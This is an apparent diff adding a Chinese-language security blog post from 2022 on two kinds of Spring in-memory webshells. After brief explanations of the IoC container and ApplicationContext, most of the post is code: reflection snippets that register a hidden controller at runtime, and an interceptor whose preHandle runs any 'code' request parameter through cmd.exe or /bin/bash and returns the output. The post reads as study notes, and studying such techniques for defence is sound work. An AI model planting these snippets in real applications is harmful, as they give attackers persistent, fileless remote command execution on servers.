@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>Blog Of SEVENTEEN</title>
+
+    <link rel = "Shortcut Icon" href="../img/favicon.ico">
+
+    <!-- Bootstrap core CSS -->
+    <link href="../vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom fonts for this template -->
+    <link href="../vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
+    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet'
+          type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800'
+          rel='stylesheet' type='text/css'>
+
+    <!-- Custom styles for this template -->
+    <link href="../css/clean-blog.min.css" rel="stylesheet">
+
+    <!-- Code highlight-->
+    <link rel="stylesheet" href="../highlight/styles/ashes.min.css">
+    
+    <!-- fancybox-->
+    <link  href="../css/jquery.fancybox.min.css" rel="stylesheet">
+    
+
+</head>
+
+<body>
+
+<!-- Navigation -->
+<nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+        <a class="navbar-brand" href="../index.html">Index</a>
+        <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse"
+                data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false"
+                aria-label="Toggle navigation">
+            Menu
+            <i class="fas fa-bars"></i>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarResponsive">
+            <ul class="navbar-nav ml-auto">
+                <li class="nav-item">
+                    <a class="nav-link" href="../index.html">Home</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../about.html">About</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../contact.html">Contact</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+</nav>
+
+<!-- Page Header -->
+<header class="masthead" style="background-image: url('../img/post-bg.jpeg')">
+    <div class="overlay"></div>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+                <div class="post-heading">
+                    <h1>浅析Spring两种内存马</h1>
+                    <h2 class="subheading">浅析Spring两种内存马</h2>
+                    <span class="meta">Posted by
+              <a href="#">SEVENTEEN</a>
+              on May 10, 2022</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+
+                <h2 class="section-heading">前言</h2>
+
+                <p>&nbsp;&nbsp;&nbsp;快要进入期末复习了，抓紧时间学一手java安全相关的知识，这次来看看Spring内存马。</p>
+                	
+                	<h2 class="section-heading">IoC容器与Bean</h2>
+                
+                <p>&nbsp;&nbsp;&nbsp;Spring通过IoC容器集中负责创建组件、根据依赖关系组装组件、按依赖顺序正确销毁组件，
+                	借用依赖注入来维护类与类之间的关系。在配置Ioc容器的config.xml中，可以看到一种通过xml文件形式配置IoC容器。
+                	Spring应用主要是由一个个的Bean构成的，而Bean是由Spring IoC容器负责实例化、配置、组装和管理的对象。
+                	如果要访问和操作Bean，一般要获得当前代码执行环境的IoC 容器代表者ApplicationContext。</p>
+                	
+                
+                
+                <h2 class="section-heading">ApplicationContext</h2>
+                
+                <p>&nbsp;&nbsp;&nbsp;在Spring框架中，BeanFactory接口是Spring IoC容器的实际代表者。
+                	而ApplicationContext接口又继承了BeanFactory接口，并通过继承其他接口扩展了基本容器的功能。
+                	因此，org.springframework.context.ApplicationContext接口也代表IoC容器，
+                	它负责实例化、定位、配置应用程序中的对象(Bean)及建立这些对象间(Beans)的依赖。</p>
+                	
+                	<h2 class="section-heading">DispatcherServlet</h2>
+                	
+                	<p>&nbsp;&nbsp;&nbsp;DispatcherServlet的主要作用是处理传入的web请求，根据配置的URL pattern，
+                		将请求分发给正确的Controller和View。并且DispatcherServlet继承自HttpServlet从本质上来讲是一个Servlet。</p>
+                	
+                	<h2 class="section-heading">获取代码运行的上下文</h2>
+                	
+                	<p>&nbsp;&nbsp;&nbsp;1. getCurrentWebApplicationContext</p>
+                	
+                	<div>
+                		
+                		<pre class='hljs'><code><span class="hljs-attribute">WebApplicationContext context </span>=<span class="hljs-string"> ContextLoader.getCurrentWebApplicationContext();</span></code></pre>
+                		
+                		</div>
+                		
+                		
+                	<p>&nbsp;&nbsp;&nbsp;2. WebApplicationContextUtils</p>
+                	
+                	<div>
+                		
+                		<pre class='hljs'><code><span class="hljs-type">WebApplicationContext</span> context = <span class="hljs-type">WebApplicationContextUtils</span>.getWebApplicationContext(<span class="hljs-type">RequestContextUtils</span>.getWebApplicationContext(((<span class="hljs-type">ServletRequestAttributes</span>)<span class="hljs-type">RequestContextHolder</span>.currentRequestAttributes<span class="hljs-literal">()</span>).getRequest<span class="hljs-literal">()</span>).getServletContext<span class="hljs-literal">()</span>);</code></pre>
+                		
+                		</div>
+                		
+                		
+                	<p>&nbsp;&nbsp;&nbsp;3. RequestContextUtils(推荐)</p>
+                	
+                	<div>
+                		
+                		<pre class='hljs'><code><span class="hljs-type">WebApplicationContext</span> context = <span class="hljs-type">RequestContextUtils</span>.getWebApplicationContext(((<span class="hljs-type">ServletRequestAttributes</span>)<span class="hljs-type">RequestContextHolder</span>.currentRequestAttributes<span class="hljs-literal">()</span>).getRequest<span class="hljs-literal">()</span>);</code></pre>
+                		
+                	<div>	
+                		
+                		
+                	<p>&nbsp;&nbsp;&nbsp;4. getAttribute(推荐)</p>
+                	
+                	<div>
+                		
+                		<pre class='hljs'><code><span class="hljs-title">WebApplicationContext</span> context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span>, <span class="hljs-number">0</span>);</code></pre>
+                		
+                		</div>
+                		
+                		<p>&nbsp;&nbsp;&nbsp;因为Root Context无法访问Child Context中定义的bean，所以可能会导致Root WebApplicationContext获得不了RequestMappingHandlerMapping的实例bean。</p>
+                		<p>&nbsp;&nbsp;&nbsp;比如: 很多应用配置中注册Controller的component-scan组件都配置在类似的dispatcherServlet-servlet.xml中，而不是全局配置文件applicationContext.xml中。
+                			就导致RequestMappingHandlerMapping的实例bean只存在于Child WebApplicationContext环境中，而不是Root WebApplicationContext中。</p>
+                			<p>&nbsp;&nbsp;&nbsp;另外，在有些Spring应用逻辑比较简单的情况下，可能没有配置ContextLoaderListener、也没有类似applicationContext.xml的全局配置文件，只有简单的servlet配置文件，也是获取不到Root WebApplicationContext的。
+                			</p>
+                		
+                		<h2 class="section-heading">注册controller</h2>
+                	
+                	<p>&nbsp;&nbsp;&nbsp;1. registerMapping</p>
+                	
+                	<div>
+                		
+<pre class='hljs'><code><span class="hljs-comment">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span>
+RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.<span class="hljs-keyword">class</span>);
+<span class="hljs-comment">// 个别老旧项目使用旧式注解映射器要通过DefaultAnnotationHandlerMapping获取实例bean</span>
+<span class="hljs-comment">// RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(DefaultAnnotationHandlerMapping.class);</span>
+<span class="hljs-comment">// 2. 通过反射获得自定义 controller 中的 Method 对象</span>
+Method method2 = ControllerShell.<span class="hljs-keyword">class</span>.getMethod(<span class="hljs-string">"parseRequest"</span>);
+<span class="hljs-comment">// 3. 定义访问 controller 的 URL 地址</span>
+PatternsRequestCondition url = <span class="hljs-keyword">new</span> PatternsRequestCondition(<span class="hljs-string">"/log"</span>);
+<span class="hljs-comment">// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span>
+RequestMethodsRequestCondition ms = <span class="hljs-keyword">new</span> RequestMethodsRequestCondition();
+<span class="hljs-comment">// 5. 在内存中动态注册 controller</span>
+RequestMappingInfo info = <span class="hljs-keyword">new</span> RequestMappingInfo(url, ms, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);
+<span class="hljs-comment">// 创建用于处理请求的对象，加入“aaa”参数是为了触发第二个构造函数避免无限循环</span>
+ControllerShell injectToController = <span class="hljs-keyword">new</span> ControllerShell(<span class="hljs-string">"nil"</span>);
+mappingHandlerMapping.registerMapping(info, injectToController, method2);</code></pre>
+                		
+                		<div>
+                	
+                	<p>&nbsp;&nbsp;&nbsp;2. registerHandler</p>
+                	
+                	 <div>
+                		
+                		<pre class='hljs'><code><span class="hljs-comment">// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean</span>
+context.getBeanFactory().registerSingleton(<span class="hljs-string">"dynamicController"</span>, Class.forName(<span class="hljs-string">"me.landgrey.SSOLogin"</span>).newInstance());
+<span class="hljs-comment">// 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean</span>
+org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping  dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.<span class="hljs-keyword">class</span>);
+<span class="hljs-comment">// 3. 反射获得 registerHandler Method</span>
+java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.<span class="hljs-keyword">class</span>.getDeclaredMethod(<span class="hljs-string">"registerHandler"</span>, <span class="hljs-built_in">String</span>.<span class="hljs-keyword">class</span>, <span class="hljs-built_in">Object</span>.<span class="hljs-keyword">class</span>);
+m1.setAccessible(<span class="hljs-keyword">true</span>);
+<span class="hljs-comment">// 4. 将 dynamicController 和 URL 注册到 handlerMap 中</span>
+m1.invoke(dh, <span class="hljs-string">"/favicon"</span>, <span class="hljs-string">"dynamicController"</span>);</code></pre>
+                		
+                		<div>
+                			
+                			
+                	<p>&nbsp;&nbsp;&nbsp;3. detectHandlerMethods</p>
+                	
+                 	<div>
+                		
+                		<pre class='hljs'><code>// <span class="hljs-number">1</span>. 在当前上下文环境中注册一个名为 dynamicController 的 <span class="hljs-type">Webshell</span> controller 实例 bean
+context.getBeanFactory().registerSingleton(<span class="hljs-string">"dynamicController"</span>, <span class="hljs-type">Class</span>.forName(<span class="hljs-string">"me.landgrey.SSOLogin"</span>).newInstance());
+// <span class="hljs-number">2</span>. 从当前上下文环境中获得 <span class="hljs-type">RequestMappingHandlerMapping</span> 的实例 bean
+org.springframework.web.servlet.mvc.<span class="hljs-keyword">method</span>.annotation.<span class="hljs-type">RequestMappingHandlerMapping</span> requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.<span class="hljs-keyword">method</span>.annotation.<span class="hljs-type">RequestMappingHandlerMapping</span>.class);
+java.lang.reflect.<span class="hljs-type">Method</span> m1 = org.springframework.web.servlet.handler.<span class="hljs-type">AbstractHandlerMethodMapping</span>.class.getDeclaredMethod(<span class="hljs-string">"detectHandlerMethods"</span>, <span class="hljs-type">Object</span>.class);
+m1.setAccessible(<span class="hljs-literal">true</span>);
+// <span class="hljs-number">3</span>. 反射调用requestMappingHandlerMapping的detectHandlerMethods方法注册controller
+m1.invoke(requestMappingHandlerMapping, <span class="hljs-string">"dynamicController"</span>);</code></pre>
+                		
+                		<div>               	
+                	
+							<h2 class="section-heading">注册Interceptor</h2>
+
+							<p>&nbsp;&nbsp;&nbsp;拦截器必须实现HandlerInterceptor接口，并且拦截器只会拦截控制器的方法，HandlerInterceptor接口中有三个方法:</p>
+
+							<p>&nbsp;&nbsp;&nbsp;1. preHandle: controller方法执行前拦截的方法</p>
+							
+							<p>(1)可以使用request或者response跳转到指定的页面。/p>
+							
+							<p>(2)return true放行，执行下一个拦截器。如果没有拦截器，执行controller中的方法。</p>
+							
+							<p>(3)return false不放行，不会执行controller中的方法。</p>
+							
+							<p>&nbsp;&nbsp;&nbsp;2. postHandle: controller方法执行后执行的方法，在JSP视图执行前。</p>
+							
+							<p>(1)可以使用request或者response跳转到指定的页面。</p>
+							
+							<p>(2)如果指定了跳转的页面，那么controller方法跳转的页面将不会显示。</p>
+							
+							<p>&nbsp;&nbsp;&nbsp;3. afterCompletion: JSP执行后执行</p>
+							
+							<div>
+								
+								<pre class='hljs'><code>@<span class="hljs-type">Override</span>
+public boolean preHandle(<span class="hljs-type">HttpServletRequest</span> request, <span class="hljs-type">HttpServletResponse</span> response, <span class="hljs-type">Object</span> handler) throws <span class="hljs-type">Exception</span> {
+    <span class="hljs-type">String</span> arg0 = request.getParameter(<span class="hljs-string">"code"</span>);
+    <span class="hljs-keyword">if</span> (arg0 != null) {
+        <span class="hljs-type">PrintWriter</span> writer = response.getWriter<span class="hljs-literal">()</span>;
+        <span class="hljs-type">String</span> o = <span class="hljs-string">""</span>;
+        java.lang.<span class="hljs-type">ProcessBuilder</span> p;
+        <span class="hljs-keyword">if</span> (<span class="hljs-type">System</span>.getProperty(<span class="hljs-string">"os.name"</span>).toLowerCase<span class="hljs-literal">()</span>.contains(<span class="hljs-string">"win"</span>)) {
+            p = <span class="hljs-keyword">new</span> java.lang.<span class="hljs-type">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">String</span><span class="hljs-literal">[]</span>{<span class="hljs-string">"cmd.exe"</span>, <span class="hljs-string">"/c"</span>, arg0});
+        } <span class="hljs-keyword">else</span> {
+            p = <span class="hljs-keyword">new</span> java.lang.<span class="hljs-type">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">String</span><span class="hljs-literal">[]</span>{<span class="hljs-string">"/bin/bash"</span>, <span class="hljs-string">"-c"</span>, arg0});
+        }
+        java.util.<span class="hljs-type">Scanner</span> c = <span class="hljs-keyword">new</span> java.util.<span class="hljs-type">Scanner</span>(p.start<span class="hljs-literal">()</span>.getInputStream<span class="hljs-literal">()</span>).useDelimiter(<span class="hljs-string">"\\A"</span>);
+        o = c.hasNext<span class="hljs-literal">()</span> ? c.next<span class="hljs-literal">()</span> : o;
+        c.close<span class="hljs-literal">()</span>;
+        writer.write(o);
+        writer.flush<span class="hljs-literal">()</span>;
+        writer.close<span class="hljs-literal">()</span>;
+        return <span class="hljs-literal">true</span>;
+    } <span class="hljs-keyword">else</span> {
+        return <span class="hljs-literal">true</span>;
+    }
+}</code></pre>
+								
+								</div>
+
+                <h2 class="section-heading">There Is Nothing Below</h2>
+                <p>&nbsp;&nbsp;&nbsp;</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/post-bg.jpeg" alt="">
+                </a>
+                <span class="caption text-muted">Turn at the next intersection.</span>
+
+                <blockquote class="blockquote">
+                </blockquote>
+
+            </div>
+        </div>
+    </div>
+</article>
+
+<hr>
+
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+                <ul class="list-inline text-center">
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-facebook-f fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                </ul>
+                <p class="copyright text-muted">Copyright &copy; SEVENTEEN 2022</p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- Bootstrap core JavaScript -->
+<script src="../vendor/jquery/jquery.min.js"></script>
+<script src="../vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+<!-- Custom scripts for this template -->
+<script src="../js/clean-blog.min.js"></script>
+
+<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+<script src="../js/jquery.fancybox.min.js"></script>
+                  
+</body>
+
+</html>
